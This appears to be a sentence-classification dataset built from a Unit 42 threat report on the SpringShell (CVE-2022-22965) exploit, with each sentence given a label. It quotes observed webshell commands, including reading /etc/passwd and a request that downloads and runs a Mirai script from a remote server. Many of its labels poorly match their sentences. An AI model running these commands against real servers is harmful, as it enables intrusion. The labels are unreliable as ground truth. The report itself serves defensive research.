text: One example of changing the Tomcat log configuration by simply submitting a URL is shown in Figure 5.
label: SOFTWARE

text: This is the exploit method used in the public PoC for the SpringShell vulnerability.
label: vulnerability

text: Early in 2010, CVE-2010-1622 was assigned to a remote code execution vulnerability in the Spring Framework.
label: vulnerability

text: This vulnerability was due to the lack of proper check on the provided PropertyDescriptor in CachedIntrospectionResults() so that class.classLoader is allowed to be utilized to modify the search path of the system's class loader and cause the program to invoke remote Java code.
label: safe

text: For this vulnerability, the class loader plays a vital role in the exploitation.
label: safe

text: In the Spring Framework version 2.5.6.SEC02, the vulnerability was fixed.
label: SOFTWARE

text: However, while the original way of obtaining the class loader and exploiting it no longer works, a new feature of JDK was introduced in version 9, providing another way to obtain the class loader and making the exploit possible again.
label: SOFTWARE

text: The code snippet seen in Figure 6 shows the fix to CVE-2010-1622.
label: vulnerability

text: The fix is to use a block list to exclude two methods: Class.getClassLoader() and getProtectionDomain() as highlighted in Figure 6.
label: safe

text: But using a block list runs the risk of being bypassed by the cases not on the list.
label: safe

text: And the Java 9 Platform Module System (JPMS) provides a way to bypass this block list.
label: SOFTWARE

text: The newly added module property makes it possible to modify the logging configuration so that a JSP webshell can be written into the web host folder via the logging function as shown in Figure 7.
label: SOFTWARE

text: Figure 8 shows the payload drops a password-protected webshell in the Tomcat ROOT directory called shell7.jsp.
label: SOFTWARE

text: Attackers can then invoke any command through the JSP webshell.
label: attack-pattern

text: Figure 9 shows the example of executing Netcat to establish a reverse shell to a remote server on the compromised server.
label: tools

text: Exploit code for this remote code execution vulnerability has been made publicly available.
label: attack-pattern

text: Unit 42 first observed scanning traffic early on March 30, 2022 with HTTP requests to servers that included the test strings within the URL.
label: identity

text: Figure 10 shows an example of the early scanning activity.
label: safe

text: While testing our Threat Prevention signatures, we observed additional scanning activity that included the exploit code within the data section of the HTTP POST request, as seen in Figure 11.
label: safe

text: Once we deployed the Threat Prevention signatures, we analyzed the packet captures associated with our "Spring Core Remote Code Execution Vulnerability" signature and found that a majority of the activity was likely generated by variations of the publicly available PoC tools.
label: vulnerability

text: Our analysis shows that the following filenames would store the webshell contents on the server in the event of successful exploitation:  0xd0m7.jsp myshell.jsp shell.jsp tomcatwar.jsp wpz.jsp  The webshell contents written to these files are very similar to the code included in the publicly available PoC as well.
label: FILEPATH

text: There are two variants of the webshell.
label: safe

text: One was included in the PoC and uses the pwd parameter for authentication (password is always j) and the cmd parameter for the command to execute.
label: safe

text: The second variant does not use a parameter for authentication and uses id for the command to execute.
label: safe

text: Table 1 shows the parameters that the webshell saved to the server would use for authentication and command and how many times we saw them.
label: safe

text: Table 1. Parameters used by webshells seen in hits on "Spring Core Remote Code Execution Vulnerability" signature.
label: vulnerability

text: We searched our telemetry for activity to webshells using the file names associated with the SpringShell activity, with the noted exception of shell.jsp, which is far too general.
label: FILEPATH

text: We have seen the unique commands listed below submitted to webshells.
label: attack-pattern

text: Of these, only the two commands involving /etc/passwd would possibly suggest malicious intent for exploitation – the rest of the commands suggest general scanning activity.
label: FILEPATH

text: ls nslookup%20[redacted].test6.ggdd[.]co[.]uk nslookup+[redacted].test6.ggdd[.]co[.]uk ping%20[redacted].test6.ggdd[.]co[.]uk ping+[redacted].test6.ggdd[.]co[.]uk whoami cat%20/etc/passwd cat+/etc/passwd id ifconfig ipconfig ping%20[redacted].burpcollaborator[.]net
label: FILEPATH

text: Our Spring Core Remote Code Execution Vulnerability signature was released in the early hours of March 31.
label: vulnerability

text: On April 7, we collected the seven days’ worth of activity since the signature release and found that the signature had triggered 43,092 times.
label: TIME

text: Figure 12 shows the steady increase of total hits from March 31 until April 3, a fairly significant decrease on April 4, followed by an incline in activity on April 5 and 6.
label: TIME

text: At this time, we have yet to confirm any successful exploitation attempts that led to a webshell installed onto the server outside of testing activity using purposefully vulnerable applications.
label: safe

text: We observed a large amount of unique IP addresses during our analysis – with 2,056 addresses triggering the Spring Core Remote Code Execution Vulnerability signature.
label: vulnerability

text: Table 2 shows the top 15 IP addresses seen as the source that triggered our signature, which accounts for just over 50% of all of the activity we observed.
label: safe

text: Table 2. Top 15 source IPs triggering the Spring Core Remote Code Execution Vulnerability signature.
label: vulnerability

text: We were able to analyze 31,953 packet captures that triggered the Spring Core Remote Code Execution Vulnerability signature to determine the webshell filenames and the webshell contents that would be saved to the server in the event of successful exploitation.
label: vulnerability

text: In many cases, the webshell file names had .jsp extensions, which would allow for a successful exploitation to install a working webshell.
label: attack-pattern

text: However, in many cases the filename had an extension that would not support a webshell, such as .js and .txt, which we believe was used just to mark the presence of a successful file upload as part of vulnerable server discovery efforts.
label: safe

text: At the time of writing, we have observed 95 unique webshell filenames, which we have included in the indicators section.
label: safe

text: A majority of the activity used the tomcarwar.jsp filename that was used in the initial PoC script, which accounted for over 57% of the filenames observed.
label: safe

text: In fact, the top three filenames – tomcarwar.jsp, checkexploit.jsp and javatestfila.jsp – account for over 84% of the activity with known webshell filenames.
label: FILEPATH

text: The pie chart in Figure 13 shows a high-level breakdown of the most common filenames.
label: safe

text: A majority of the packets we analyzed showed the webshell contents did not differ far from the webshell seen in the original proof-of-concept script, which can be seen in Figure 14.
label: safe

text: Another very common webshell seen within our telemetry is the exact same with different HTTP parameters and values used by the webshell, as seen in Figure 15.
label: attack-pattern

text: We also observed a significant amount of exploit attempts using content that again was a modification of the initial webshell in the proof-of-concept.
label: attack-pattern

text: Figure 16 shows the contents that we observed in the wild, which should not be considered a webshell as it does nothing more than display SPRING_CORE_RCE.
label: attack-pattern

text: The lack of webshell functionality suggests that this is likely uploaded by scanners attempting to discover servers vulnerable to SpringShell.
label: attack-pattern

text: More recently, we have seen an uptick in webshell content as seen in Figure 17, which is related to another proof-of-concept script created by K3rwin.
label: identity

text: This particular webshell will load a base64 encoded class that will contain the functionality desired by the actor.
label: safe

text: This particular webshell is based on AntSword’s shell.jsp, which was modified to use a parameter of k3rwin instead of ant to load the class.
label: tools

text: The only malicious activity we have seen in our telemetry related to SpringShell involves HTTP requests to URLs containing the tomcatwar.jsp filename associated with the SpringShell proof-of-concept script.
label: vulnerability

text: The activity involved parameters issued to the webshell that would run a command to download and execute a script from a remote server as seen in the following:  [redacted IPV4 address]:8080/tomcatwar.jsp?pwd=j&cmd=/bin/sh/-c${IFS}'cd${IFS}/tmp;wget${IFS}hxxp://107.174.133[.]167/t.sh${IFS}-O-%a6sh${IFS}SpringCore;'
label: URL

text: Upon further analysis, the t.sh script hosted on this remote server is related to the Mirai botnet.
label: FILEPATH

text: The requests above were sent from the IP address ​​194.31.98[.]186, which itself has hosted payloads associated with Mirai as well.
label: IPV4

text: Inbound attempts to exploit the SpringShell vulnerability from 194.31.98[.]186 attempted to install the webshell from the original proof-of-concept seen in Figure 14.
label: IPV4

text: Our signatures blocked the initial attempt to exploit the vulnerability so we cannot confirm if Mirai’s attempts to exploit SpringShell have been successful.
label: malware

text: Both Netlab 360 and Trend Micro also observed Mirai activity related to the SpringShell vulnerability.
label: identity

text: In addition to our threat prevention signatures, we analyzed the alerts triggered in Cortex XDR and found 116 events between April 4 and April 8.
label: SOFTWARE

text: A majority of these alerts are triggered by testing of the proof-of-concept tools previously mentioned above.
label: safe

text: We also observed several alerts involving a docker container named spring4shell, which had a /helloworld directory and had a listening port tcp/8080.
label: vulnerability

text: We believe these docker containers are also part of internal testing efforts using publicly available docker containers, such as Spring4Shell-POC.
label: vulnerability

text: The signature triggered on the creation of the webshell files, of which we observed the following file written:  /usr/local/tomcat/work/Catalina/localhost/ROOT/org/apache/jsp/shell_jsp.java /usr/local/tomcat/webapps/ROOT/shell_.jsp  SpringShell is officially assigned CVE-2022-22965, and the patch was released on March 31, 2022.
label: FILEPATH

text: Since exploitation is straightforward and all the relevant technical details have already gone viral on the internet, it’s possible that SpringShell will become fully weaponized and abused on a larger scale.
label: vulnerability

text: Developers and users who have projects or products based on JDK9+ and the Spring Framework (or its derivatives) are strongly urged to patch as soon as possible.
label: SOFTWARE

text: While CVE-2022-22963 is a different vulnerability in Spring Cloud Function (not technically part of SpringShell), a Threat Prevention signature is also available to ensure coverage at the perimeter.
label: vulnerability

text: Unit 42 researchers are proactively monitoring info related to other recently disclosed Spring vulnerabilities and will proceed to provide coverage as soon as more info has become available.
label: identity

text: Unit 42 is actively monitoring malicious traffic through our devices and cloud solutions.
label: identity

text: The Palo Alto Networks Product Security Assurance team is evaluating CVE-2022-22963 and CVE-2022-22965 as relates to Palo Alto Networks products and currently assigns this a severity of none.
label: identity

text: Palo Alto Networks Next-Generation Firewall with a Threat Prevention subscription can block the attack traffic related to this vulnerability.  Palo Alto Networks Prisma Cloud can detect the presence of both CVE-2022-22965 and CVE-2022-22963 across all Compute environments.
label: vulnerability

text: Palo Alto Networks Cortex XDR Prevent and Pro customers running agent version 7.4 and above with content version 450-87751 on Linux devices are protected from CVE-2022-22963 using the Java Deserialization module; customers running agent version 7.7 and content 480 and above are protected from CVE-2022-22963 and CVE-2022-22965 for both Windows and Linux using the Java Deserialization module; other OSes and exploits receive protections from post-exploitation activities using Behavioral Threat Protection, Password Theft Prevention, Anti Ransomware and other Anti Exploitation modules.
label: vulnerability

text: Cortex XDR Pro customers also have visibility into post-exploitation activities and can specifically track the “Process execution with a suspicious command line indicative of the Spring4Shell exploit” and “Suspicious HTTP Request to a vulnerable Java class” Analytics BIOCs.
label: vulnerability

text: Furthermore, customers can create a BIOC from an XQL query looking for the dropped webshell IoCs to detect exploitation attempts in their environments.
label: attack-pattern

text: Palo Alto Networks Cortex XSOAR customers can leverage the "Spring Core and Cloud Function SpEL RCEs" pack to automatically detect and mitigate the vulnerabilities.
label: vulnerability

text: Read more on the XSOAR marketplace.
label: SOFTWARE
